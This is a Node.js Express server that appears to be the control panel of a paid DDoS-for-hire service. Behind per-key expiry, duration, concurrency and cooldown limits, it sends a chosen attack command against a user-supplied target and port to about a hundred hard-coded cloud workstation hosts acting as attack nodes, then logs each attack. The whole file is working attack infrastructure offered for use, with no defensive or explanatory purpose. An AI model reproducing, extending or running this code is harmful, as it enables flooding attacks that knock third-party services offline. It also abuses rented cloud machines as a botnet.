const express = require('express');
const axios = require('axios');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 21743;

// Load data
const methods = require('./methods.json');
const keys = require('./key.json');
const config = require('./config.json');

// Define servers directly in the code instead of loading from servers.json
const servers = [
    {
        "name": "spi-34975693",
        "host": "https://8080-idx-spi-1746560856295.cluster-6dx7corvpngoivimwvvljgokdw.cloudworkstations.dev"
    },
    {
        "name": "api-33513622",
        "host": "https://8080-idx-api-1746560851727.cluster-htdgsbmflbdmov5xrjithceibm.cloudworkstations.dev"
    },
    {
        "name": "api-80755841",
        "host": "https://8080-idx-api-1746560861212.cluster-htdgsbmflbdmov5xrjithceibm.cloudworkstations.dev"
    },
    {
        "name": "api-54642745",
        "host": "https://8080-idx-api-1746560831600.cluster-ys234awlzbhwoxmkkse6qo3fz6.cloudworkstations.dev"
    },
    {
        "name": "api-96292903",
        "host": "https://8080-idx-api-1746560828182.cluster-htdgsbmflbdmov5xrjithceibm.cloudworkstations.dev"
    },
    {
        "name": "api-65823814",
        "host": "https://8080-idx-api-1746560754525.cluster-iktsryn7xnhpexlu6255bftka4.cloudworkstations.dev"
    },
    {
        "name": "api-01830850",
        "host": "https://8080-idx-api-1746560990605.cluster-nzwlpk54dvagsxetkvxzbvslyi.cloudworkstations.dev"
    },
    {
        "name": "api-44951416",
        "host": "https://8080-idx-api-1746561188305.cluster-44kx2eiocbhe2tyk3zoyo3ryuo.cloudworkstations.dev"
    },
    {
        "name": "api-99404236",
        "host": "https://8080-idx-api-1746561275735.cluster-zkm2jrwbnbd4awuedc2alqxrpk.cloudworkstations.dev"
    },
    {
        "name": "api-79649140",
        "host": "https://8080-idx-api-1746561395430.cluster-xpmcxs2fjnhg6xvn446ubtgpio.cloudworkstations.dev"
    },
    {
        "name": "api-78445584",
        "host": "https://8080-idx-api-1746559172160.cluster-fkltigo73ncaixtmokrzxhwsfc.cloudworkstations.dev"
    },
    {
        "name": "api-96297396",
        "host": "https://8080-idx-api-1746559167817.cluster-zumahodzirciuujpqvsniawo3o.cloudworkstations.dev"
    },
    {
        "name": "api-02351288",
        "host": "https://8080-idx-api-1746559139104.cluster-6dx7corvpngoivimwvvljgokdw.cloudworkstations.dev"
    },
    {
        "name": "api-27459875",
        "host": "https://8080-idx-api-1746559134603.cluster-ubrd2huk7jh6otbgyei4h62ope.cloudworkstations.dev"
    },
    {
        "name": "api-36681279",
        "host": "https://8080-idx-api-1746559127725.cluster-w5vd22whf5gmav2vgkomwtc4go.cloudworkstations.dev"
    },
    {
        "name": "api-96789608",
        "host": "https://8080-idx-api-1746559707554.cluster-ikxjzjhlifcwuroomfkjrx437g.cloudworkstations.dev"
    },
    {
        "name": "api-19071381",
        "host": "https://8080-idx-api-1746559155719.cluster-6dx7corvpngoivimwvvljgokdw.cloudworkstations.dev"
    },
    {
        "name": "api-83308712",
        "host": "https://8080-idx-api-1746559878262.cluster-73qgvk7hjjadkrjeyexca5ivva.cloudworkstations.dev"
    },
    {
        "name": "api-00173791",
        "host": "https://8080-idx-api-1746560084260.cluster-73qgvk7hjjadkrjeyexca5ivva.cloudworkstations.dev"
    },
    {
        "name": "api-21407164",
        "host": "https://8080-idx-api-1746560192368.cluster-ancjwrkgr5dvux4qug5rbzyc2y.cloudworkstations.dev"
    },
    {
        "name": "api-24798174",
        "host": "https://8080-idx-api-1746556892311.cluster-zumahodzirciuujpqvsniawo3o.cloudworkstations.dev"
    },
    {
        "name": "api-81558684",
        "host": "https://8080-idx-api-1746556896193.cluster-nzwlpk54dvagsxetkvxzbvslyi.cloudworkstations.dev"
    },
    {
        "name": "api-10729416",
        "host": "https://8080-idx-api-1746556929826.cluster-73qgvk7hjjadkrjeyexca5ivva.cloudworkstations.dev"
    },
    {
        "name": "api-50291229",
        "host": "https://8080-idx-api-1746556940313.cluster-htdgsbmflbdmov5xrjithceibm.cloudworkstations.dev"
    },
    {
        "name": "api-37407607",
        "host": "https://8080-idx-api-1746556935064.cluster-bg6uurscprhn6qxr6xwtrhvkf6.cloudworkstations.dev"
    },
    {
        "name": "api-45774880",
        "host": "https://8080-idx-api-1746557079547.cluster-73qgvk7hjjadkrjeyexca5ivva.cloudworkstations.dev"
    },
    {
        "name": "api-56824721",
        "host": "https://8080-idx-api-1746557477540.cluster-zumahodzirciuujpqvsniawo3o.cloudworkstations.dev"
    },
    {
        "name": "api-47380376",
        "host": "https://8080-idx-api-1746557745172.cluster-nzwlpk54dvagsxetkvxzbvslyi.cloudworkstations.dev"
    },
    {
        "name": "api-63528285",
        "host": "https://8080-idx-api-1746556901103.cluster-6dx7corvpngoivimwvvljgokdw.cloudworkstations.dev"
    },
    {
        "name": "api-31156191",
        "host": "https://8080-idx-api-1746557872071.cluster-isls3qj2gbd5qs4jkjqvhahfv6.cloudworkstations.dev"
    },
    {
        "name": "api-47523424",
        "host": "https://8080-idx-api-1746551521771.cluster-ejd22kqny5htuv5dfowoyipt52.cloudworkstations.dev"
    },
    {
        "name": "api-88416873",
        "host": "https://8080-idx-api-1746551526344.cluster-ys234awlzbhwoxmkkse6qo3fz6.cloudworkstations.dev"
    },
    {
        "name": "api-61066899",
        "host": "https://8080-idx-api-1746551530589.cluster-44kx2eiocbhe2tyk3zoyo3ryuo.cloudworkstations.dev"
    },
    {
        "name": "api-67826471",
        "host": "https://8080-idx-api-1746551502494.cluster-nzwlpk54dvagsxetkvxzbvslyi.cloudworkstations.dev"
    },
    {
        "name": "api-53353174",
        "host": "https://8080-idx-api-1746551497948.cluster-fdkw7vjj7bgguspe3fbbc25tra.cloudworkstations.dev"
    },
    {
        "name": "api-55494530",
        "host": "https://8080-idx-api-1746551494670.cluster-nzwlpk54dvagsxetkvxzbvslyi.cloudworkstations.dev"
    },
    {
        "name": "api-43399091",
        "host": "https://8080-idx-api-1746551666634.cluster-ancjwrkgr5dvux4qug5rbzyc2y.cloudworkstations.dev"
    },
    {
        "name": "api-32002144",
        "host": "https://8080-idx-api-1746551807008.cluster-nzwlpk54dvagsxetkvxzbvslyi.cloudworkstations.dev"
    },
    {
        "name": "api-59949800",
        "host": "https://8080-idx-api-1746551877471.cluster-bg6uurscprhn6qxr6xwtrhvkf6.cloudworkstations.dev"
    },
    {
        "name": "api-81258072",
        "host": "https://8080-idx-api-1746551943077.cluster-73qgvk7hjjadkrjeyexca5ivva.cloudworkstations.dev"
    },
    {
        "name": "api-17803902",
        "host": "https://8080-idx-api-1746552369146.cluster-zkm2jrwbnbd4awuedc2alqxrpk.cloudworkstations.dev"
    },
    {
        "name": "api-47195707",
        "host": "https://8080-idx-api-1746552355385.cluster-6dx7corvpngoivimwvvljgokdw.cloudworkstations.dev"
    },
    {
        "name": "api-17803902",
        "host": "https://8080-idx-api-1746552369146.cluster-zkm2jrwbnbd4awuedc2alqxrpk.cloudworkstations.dev"
    },
    {
        "name": "api-37982191",
        "host": "https://8080-idx-api-1746552312990.cluster-fkltigo73ncaixtmokrzxhwsfc.cloudworkstations.dev"
    },
    {
        "name": "api-85027795",
        "host": "https://8080-idx-api-1746552301939.cluster-fkltigo73ncaixtmokrzxhwsfc.cloudworkstations.dev"
    },
    {
        "name": "api-44105415",
        "host": "https://8080-idx-api-1746552298345.cluster-iktsryn7xnhpexlu6255bftka4.cloudworkstations.dev"
    },
    {
        "name": "api-15933467",
        "host": "https://8080-idx-api-1746552573219.cluster-bg6uurscprhn6qxr6xwtrhvkf6.cloudworkstations.dev"
    },
    {
        "name": "api-70914639",
        "host": "https://8080-idx-api-1746552645962.cluster-ikxjzjhlifcwuroomfkjrx437g.cloudworkstations.dev"
    },
    {
        "name": "api-19708549",
        "host": "https://8080-idx-api-1746552775324.cluster-ejd22kqny5htuv5dfowoyipt52.cloudworkstations.dev"
    },
    {
        "name": "api-09292617",
        "host": "https://8080-idx-api-1746552706772.cluster-6dx7corvpngoivimwvvljgokdw.cloudworkstations.dev"
    },
    {
        "name": "api-63636302",
        "host": "https://8080-idx-api-1746553321333.cluster-nzwlpk54dvagsxetkvxzbvslyi.cloudworkstations.dev"
    },
    {
        "name": "api-98061987",
        "host": "https://8080-idx-api-1746553312530.cluster-xpmcxs2fjnhg6xvn446ubtgpio.cloudworkstations.dev"
    },
    {
        "name": "api-15120880",
        "host": "https://8080-idx-api-1746553308099.cluster-ikxjzjhlifcwuroomfkjrx437g.cloudworkstations.dev"
    },
    {
        "name": "api-00532534",
        "host": "https://8080-idx-api-1746553290065.cluster-xpmcxs2fjnhg6xvn446ubtgpio.cloudworkstations.dev"
    },
    {
        "name": "api-27059651",
        "host": "https://8080-idx-api-1746553278787.cluster-zumahodzirciuujpqvsniawo3o.cloudworkstations.dev"
    },
    {
        "name": "api-07669393",
        "host": "https://8080-idx-api-1746553273400.cluster-iktsryn7xnhpexlu6255bftka4.cloudworkstations.dev"
    },
    {
        "name": "api-51393038",
        "host": "https://8080-idx-api-1746553471212.cluster-xpmcxs2fjnhg6xvn446ubtgpio.cloudworkstations.dev"
    },
    {
        "name": "api-28217414",
        "host": "https://8080-idx-api-1746553794390.cluster-sumfw3zmzzhzkx4mpvz3ogth4y.cloudworkstations.dev"
    },
    {
        "name": "api-56425756",
        "host": "https://8080-idx-api-1746553945287.cluster-ikxjzjhlifcwuroomfkjrx437g.cloudworkstations.dev"
    },
    {
        "name": "api-46124754",
        "host": "https://8080-idx-api-1746553610488.cluster-fdkw7vjj7bgguspe3fbbc25tra.cloudworkstations.dev"
    },
    {
        "name": "api-62679421",
        "host": "https://8080-idx-api-1746554434133.cluster-xpmcxs2fjnhg6xvn446ubtgpio.cloudworkstations.dev"
    },
    {
        "name": "api-88197094",
        "host": "https://8080-idx-api-1746554425216.cluster-bg6uurscprhn6qxr6xwtrhvkf6.cloudworkstations.dev"
    },
    {
        "name": "api-36552465",
        "host": "https://8080-idx-api-1746554402691.cluster-ubrd2huk7jh6otbgyei4h62ope.cloudworkstations.dev"
    },
    {
        "name": "api-28418138",
        "host": "https://8080-idx-api-1746554397546.cluster-fdkw7vjj7bgguspe3fbbc25tra.cloudworkstations.dev"
    },
    {
        "name": "api-07500668",
        "host": "https://8080-idx-api-1746554393902.cluster-htdgsbmflbdmov5xrjithceibm.cloudworkstations.dev"
    },
    {
        "name": "api-81373114",
        "host": "https://8080-idx-api-1746554619057.cluster-fdkw7vjj7bgguspe3fbbc25tra.cloudworkstations.dev"
    },
    {
        "name": "api-15868539",
        "host": "https://8080-idx-api-1746554883349.cluster-zumahodzirciuujpqvsniawo3o.cloudworkstations.dev"
    },
    {
        "name": "api-73637124",
        "host": "https://8080-idx-api-1746554985659.cluster-w5vd22whf5gmav2vgkomwtc4go.cloudworkstations.dev"
    },
    {
        "name": "api-32110225",
        "host": "https://8080-idx-api-1746555070937.cluster-ikxjzjhlifcwuroomfkjrx437g.cloudworkstations.dev"
    },
    {
        "name": "api-97620227",
        "host": "https://8080-idx-api-1746554430275.cluster-6dx7corvpngoivimwvvljgokdw.cloudworkstations.dev"
    },
    {
        "name": "api-16513668",
        "host": "https://8080-idx-api-1746555636694.cluster-44kx2eiocbhe2tyk3zoyo3ryuo.cloudworkstations.dev"
    },
    {
        "name": "api-80744326",
        "host": "https://8080-idx-api-1746555627701.cluster-fdkw7vjj7bgguspe3fbbc25tra.cloudworkstations.dev"
    },
    {
        "name": "api-38040645",
        "host": "https://8080-idx-api-1746555623132.cluster-zkm2jrwbnbd4awuedc2alqxrpk.cloudworkstations.dev"
    },
    {
        "name": "api-14461589",
        "host": "https://8080-idx-api-1746555601971.cluster-fdkw7vjj7bgguspe3fbbc25tra.cloudworkstations.dev"
    },
    {
        "name": "api-26091939",
        "host": "https://8080-idx-api-1746555593389.cluster-73qgvk7hjjadkrjeyexca5ivva.cloudworkstations.dev"
    },
    {
        "name": "api-84654044",
        "host": "https://8080-idx-api-1746555753884.cluster-zumahodzirciuujpqvsniawo3o.cloudworkstations.dev"
    },
    {
        "name": "api-72898121",
        "host": "https://8080-idx-api-1746555910184.cluster-ubrd2huk7jh6otbgyei4h62ope.cloudworkstations.dev"
    },
    {
        "name": "api-75161269",
        "host": "https://8080-idx-api-1746556049796.cluster-ejd22kqny5htuv5dfowoyipt52.cloudworkstations.dev"
    },
    {
        "name": "api-39514676",
        "host": "https://8080-idx-api-1746556132612.cluster-iktsryn7xnhpexlu6255bftka4.cloudworkstations.dev"
    },
    {
        "name": "api-29556434",
        "host": "https://8080-idx-api-1746555598082.cluster-isls3qj2gbd5qs4jkjqvhahfv6.cloudworkstations.dev"
    },
    {
        "name": "api-69075757",
        "host": "https://8080-idx-api-1746548371086.cluster-fkltigo73ncaixtmokrzxhwsfc.cloudworkstations.dev"
    },
    {
        "name": "api-09394244",
        "host": "https://8080-idx-api-1746548374201.cluster-73qgvk7hjjadkrjeyexca5ivva.cloudworkstations.dev"
    },
    {
        "name": "api-99024113",
        "host": "https://8080-idx-api-1746548382872.cluster-ys234awlzbhwoxmkkse6qo3fz6.cloudworkstations.dev"
    },
    {
        "name": "api-21077257",
        "host": "https://8080-idx-api-1746548419382.cluster-zkm2jrwbnbd4awuedc2alqxrpk.cloudworkstations.dev"
    },
    {
        "name": "api-90499333",
        "host": "https://8080-idx-api-1746548414320.cluster-73qgvk7hjjadkrjeyexca5ivva.cloudworkstations.dev"
    },
    {
        "name": "api-98082020",
        "host": "https://8080-idx-api-1746548876751.cluster-sumfw3zmzzhzkx4mpvz3ogth4y.cloudworkstations.dev"
    },
    {
        "name": "api-01269952",
        "host": "https://8080-idx-api-1746549014048.cluster-zumahodzirciuujpqvsniawo3o.cloudworkstations.dev"
    },
    {
        "name": "api-57862525",
        "host": "https://8080-idx-api-1746549198262.cluster-fdkw7vjj7bgguspe3fbbc25tra.cloudworkstations.dev"
    },
    {
        "name": "api-58072681",
        "host": "https://8080-idx-api-1746549350607.cluster-ys234awlzbhwoxmkkse6qo3fz6.cloudworkstations.dev"
    },
    {
        "name": "api-45754588",
        "host": "https://8080-idx-api-1746549519727.cluster-w5vd22whf5gmav2vgkomwtc4go.cloudworkstations.dev"
    },
    {
        "name": "api-12956736",
        "host": "https://8080-idx-api-1746546640597.cluster-44kx2eiocbhe2tyk3zoyo3ryuo.cloudworkstations.dev"
    },
    {
        "name": "api-34466722",
        "host": "https://8080-idx-api-1746546646063.cluster-ejd22kqny5htuv5dfowoyipt52.cloudworkstations.dev"
    },
    {
        "name": "api-27795201",
        "host": "https://8080-idx-api-1746546635822.cluster-fdkw7vjj7bgguspe3fbbc25tra.cloudworkstations.dev"
    },
    {
        "name": "api-73598171",
        "host": "https://8080-idx-api-1746546572435.cluster-htdgsbmflbdmov5xrjithceibm.cloudworkstations.dev"
    },
    {
        "name": "api-89998953",
        "host": "https://8080-idx-api-1746546567784.cluster-w5vd22whf5gmav2vgkomwtc4go.cloudworkstations.dev"
    },
    {
        "name": "api-36599702",
        "host": "https://8080-idx-api-1746546563903.cluster-ancjwrkgr5dvux4qug5rbzyc2y.cloudworkstations.dev"
    },
    {
        "name": "api-15870846",
        "host": "https://8080-idx-api-1746546765737.cluster-ys234awlzbhwoxmkkse6qo3fz6.cloudworkstations.dev"
    },
    {
        "name": "api-90607854",
        "host": "https://8080-idx-api-1746546921721.cluster-zumahodzirciuujpqvsniawo3o.cloudworkstations.dev"
    },
    {
        "name": "api-51432652",
        "host": "https://8080-idx-api-1746546981986.cluster-bg6uurscprhn6qxr6xwtrhvkf6.cloudworkstations.dev"
    },
    {
        "name": "api-57373786",
        "host": "https://8080-idx-api-1746547113137.cluster-sumfw3zmzzhzkx4mpvz3ogth4y.cloudworkstations.dev"
    }
];

let cooldownData = {};
let attackLog = [];
let activeAttacks = {}; // Untuk tracking concurrent per token
let scheduledCooldowns = {}; // Track scheduled cooldowns

// Load cooldown.json jika ada
if (fs.existsSync('./cooldown.json')) {
    cooldownData = JSON.parse(fs.readFileSync('./cooldown.json'));
}

// Load attack_log.json jika ada
if (fs.existsSync('./attack_log.json')) {
    attackLog = JSON.parse(fs.readFileSync('./attack_log.json'));
}

// Helper untuk simpan cooldown
function saveCooldown() {
    fs.writeFileSync('./cooldown.json', JSON.stringify(cooldownData, null, 2));
}

// Helper untuk simpan attack log
function saveAttackLog() {
    fs.writeFileSync('./attack_log.json', JSON.stringify(attackLog, null, 2));
}

// Helper cek expired
function isExpired(createdAt, expiryDays) {
    const createdDate = new Date(createdAt);
    const now = new Date();
    const expiryDate = new Date(createdDate);
    expiryDate.setDate(createdDate.getDate() + expiryDays);
    return now > expiryDate;
}

// Helper buat created_at dan activeAttack awal
function ensureCreatedAt(token) {
    if (!cooldownData[token]) {
        cooldownData[token] = {
            last_attack: 0,
            created_at: new Date().toISOString()
        };
        saveCooldown();
    }
    if (!activeAttacks[token]) {
        activeAttacks[token] = 0;
    }
}

// Endpoint utama
app.get('/api/attack', async (req, res) => {
    const { token, target, time, method, port } = req.query;

    if (!token || !target || !time || !method) {
        return res.status(400).json({ status: 'error', message: 'Missing required parameters' });
    }

    if (!keys.includes(token)) {
        return res.status(403).json({ status: 'error', message: 'Invalid API key' });
    }

    const userConfig = config[token];
    if (!userConfig) {
        return res.status(403).json({ status: 'error', message: 'No configuration found for this API key' });
    }

    ensureCreatedAt(token);

    // Cek expired
    if (isExpired(cooldownData[token].created_at, userConfig.expiry_days)) {
        return res.status(403).json({ status: 'error', message: 'API key expired' });
    }

    // Cek max_time
    if (parseInt(time) > userConfig.max_time) {
        return res.status(400).json({
            status: 'error',
            message: 'Max attack time exceeded',
            maxAllowed: userConfig.max_time
        });
    }

    // Hanya larang 80/443 kalau method adalah UDP
    if (method.toLowerCase() === 'udp' && (port === '80' || port === '443')) {
        return res.status(400).json({
            status: 'error',
            message: 'Port 80 and 443 are not allowed for UDP method'
        });
    }

    // Cek concurrent limit
    if (activeAttacks[token] >= userConfig.concurrent) {
        return res.status(429).json({
            status: 'error',
            message: `Concurrent attack limit reached`,
            maxConcurrent: userConfig.concurrent
        });
    }

    // Cek cooldown realtime
    const now = Date.now();
    const lastAttack = new Date(cooldownData[token].last_attack).getTime() || 0;
    const cooldownMs = userConfig.cooldown * 1000;
    const elapsed = now - lastAttack;

    if (elapsed < cooldownMs) {
        const timeLeft = Math.ceil((cooldownMs - elapsed) / 1000);
        return res.status(429).json({
            status: 'error',
            message: 'Cooldown active',
            timeLeft: timeLeft
        });
    }

    const commandTemplate = methods[method];
    if (!commandTemplate) {
        return res.status(400).json({ status: 'error', message: 'Invalid method' });
    }

    const command = commandTemplate
        .replace('{host}', target)
        .replace('{time}', time)
        .replace('{port}', port || '');

    try {
        activeAttacks[token]++;

        // FAST SEND: kirim ke semua server tanpa await
        servers.forEach(server => {
            axios.post(server.host + '/', { command }, { timeout: 10000 })
                .catch(() => {}); // kalau error, cuekin aja
        });

        // Log the attack in attackLog
        attackLog.push({
            token,
            target,
            time: parseInt(time),
            port: parseInt(port) || null,
            method,
            timestamp: new Date().toISOString(),
            status: 'success'
        });
        saveAttackLog();

        // Schedule the cooldown to be applied after the attack completes
        const attackDurationMs = parseInt(time) * 1000;
        
        // Clear any existing scheduled cooldown for this token
        if (scheduledCooldowns[token]) {
            clearTimeout(scheduledCooldowns[token]);
        }
        
        // Set a new scheduled cooldown
        scheduledCooldowns[token] = setTimeout(() => {
            cooldownData[token].last_attack = new Date().toISOString();
            saveCooldown();
            delete scheduledCooldowns[token];
        }, attackDurationMs);

        // Langsung kirim response ke user
        res.json({
            status: 'success',
            message: 'Attack started successfully',
            data: {
                target: target,
                port: port || null,
                duration: parseInt(time),
                method: method,
                timeLeft: parseInt(time),
                cooldownStarts: 'after attack completes'
            }
        });

    } catch (error) {
        res.status(500).json({
            status: 'error',
            message: error.message
        });
    } finally {
        // Reduce active attacks counter after the attack duration
        setTimeout(() => {
            if (activeAttacks[token] > 0) {
                activeAttacks[token]--;
            }
        }, parseInt(time) * 1000);
    }
});

// New endpoint to check status including cooldown and active attacks
app.get('/api/status', (req, res) => {
    const { token } = req.query;
    
    if (!token || !keys.includes(token)) {
        return res.status(403).json({ status: 'error', message: 'Invalid API key' });
    }
    
    const userConfig = config[token];
    if (!userConfig) {
        return res.status(403).json({ status: 'error', message: 'No configuration found for this API key' });
    }
    
    ensureCreatedAt(token);
    
    const now = Date.now();
    const lastAttack = new Date(cooldownData[token].last_attack).getTime() || 0;
    const cooldownMs = userConfig.cooldown * 1000;
    const elapsed = now - lastAttack;
    let cooldownStatus = 'inactive';
    let timeLeft = 0;
    
    if (elapsed < cooldownMs) {
        cooldownStatus = 'active';
        timeLeft = Math.ceil((cooldownMs - elapsed) / 1000);
    }
    
    res.json({
        status: 'success',
        data: {
            token: token,
            max_time: userConfig.max_time,
            cooldown: userConfig.cooldown,
            concurrent: userConfig.concurrent,
            current_active_attacks: activeAttacks[token] || 0,
            cooldown_status: cooldownStatus,
            cooldown_time_left: timeLeft,
            expiry_date: new Date(new Date(cooldownData[token].created_at).getTime() + (userConfig.expiry_days * 24 * 60 * 60 * 1000)).toISOString()
        }
    });
});

// Endpoint cek server
app.get('/', (req, res) => {
    res.json({ 
        status: 'online', 
        usage: '/api/attack?token=...&target=...&time=...&method=...&port=...',
        status_check: '/api/status?token=...'
    });
});

app.listen(PORT, () => {
    console.log(`API Manager running on port ${PORT}`);
});